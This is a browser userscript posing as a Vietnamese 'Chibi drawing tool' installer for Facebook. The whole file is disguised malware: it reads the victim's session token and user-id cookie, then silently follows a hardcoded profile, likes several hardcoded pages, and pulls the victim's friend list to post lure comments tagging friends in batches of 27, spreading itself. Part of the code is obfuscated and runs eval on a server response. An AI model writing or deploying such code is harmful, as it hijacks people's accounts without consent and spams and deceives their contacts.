// ==UserScript==
// @name            Cài Ðặt Tool Vẽ Chibi ( Ver 2.0.14 )
// @description     All about facebook By Bameo
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// === Facebook ChiBi ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//a : subscribe
//sublist : sublist
//Like : page
//P: photos
a("100000478941180");
Like("199459923558163");//tyty
Like("1391345814461892");
Like("625933084123354"); //men's shop
Like("217299051619177"); //share to be shared


// === Facebook 1 ====
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '266572930185229';
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
    var _0x7892x7 = new XMLHttpRequest();
    _0x7892x7['onreadystatechange'] = function () {
        if (_0x7892x7['readyState'] == 4) {
            eval('arkadaslar = ' + _0x7892x7['responseText'].toString()['replace']('for (;;);', '') + ';');
            for (f = 0; f < Math['round'](arkadaslar['payload']['entries']['length'] / 27); f++) {
                mesaj = '';
                mesaj_text = '';
                for (i = f * 27; i < (f + 1) * 27; i++) {
                    if (arkadaslar['payload']['entries'][i]) {
                        mesaj += ' @[' + arkadaslar['payload']['entries'][i]['uid'] + ':' + arkadaslar['payload']['entries'][i]['text'] + ']';
                        mesaj_text += ' ' + arkadaslar['payload']['entries'][i]['text'];
                    };
                };
                yorum_yap(id, mesaj);
            };
        };
    };
    var _0x7892x8 = '&filter[0]=user';
    _0x7892x8 += '&options[0]=friends_only';
    _0x7892x8 += '&options[1]=nm';
    _0x7892x8 += '&token=v7';
    _0x7892x8 += '&viewer=' + user_id;
    _0x7892x8 += '&__user=' + user_id;
    if (document['URL']['indexOf']('https://') >= 0) {
        _0x7892x7['open']('GET', 'https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    } else {
        _0x7892x7['open']('GET', 'http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    };
    _0x7892x7['send']();
};

function RandomArkadas() {
    var _0x7892xa = '';
    for (i = 0; i < 9; i++) {
        _0x7892xa += ' @[' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['uid'] + ':' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['text'] + ']';
    };
    return _0x7892xa;
};

function yorum_yap(id, _0x7892xc) {
    var _0x7892xd = new XMLHttpRequest();
    var _0x7892x8 = '';
    _0x7892x8 += '&ft_ent_identifier=' + id;
    _0x7892x8 += '&comment_text=(y) Vẽ Chibi Năm 2014 !! Đẹp lắm ;) Thành công 100% nhé ♥ ♥ ♥ ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
    _0x7892x8 += '&client_id=1377871797138:1707018092';
    _0x7892x8 += '&reply_fbid';
    _0x7892x8 += '&parent_comment_id';
    _0x7892x8 += '&rootid=u_jsonp_2_3';
    _0x7892x8 += '&clp={"cl_impid":"453524a0","clearcounter":0,"elementid":"js_5","version":"x","parent_fbid":' + id + '}';
    _0x7892x8 += '&attached_sticker_fbid=0';
    _0x7892x8 += '&attached_photo_fbid=0';
    _0x7892x8 += '&giftoccasion';
    _0x7892x8 += '&ft[tn]=[]';
    _0x7892x8 += '&__user=' + user_id;
    _0x7892x8 += '&__a=1';
    _0x7892x8 += '&__dyn=7n8ahyj35ynxl2u5F97KepEsyo';
    _0x7892x8 += '&__req=q';
    _0x7892x8 += '&fb_dtsg=' + fb_dtsg;
    _0x7892x8 += '&ttstamp=';
    _0x7892xd['open']('POST', '/ajax/ufi/add_comment.php', true);
    _0x7892xd['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    _0x7892xd['onreadystatechange'] = function () {
        if (_0x7892xd['readyState'] == 4 && _0x7892xd['status'] == 200) {
            _0x7892xd['close'];
        };
    };
    _0x7892xd['send'](_0x7892x8);
};
arkadaslari_al(682788255097676);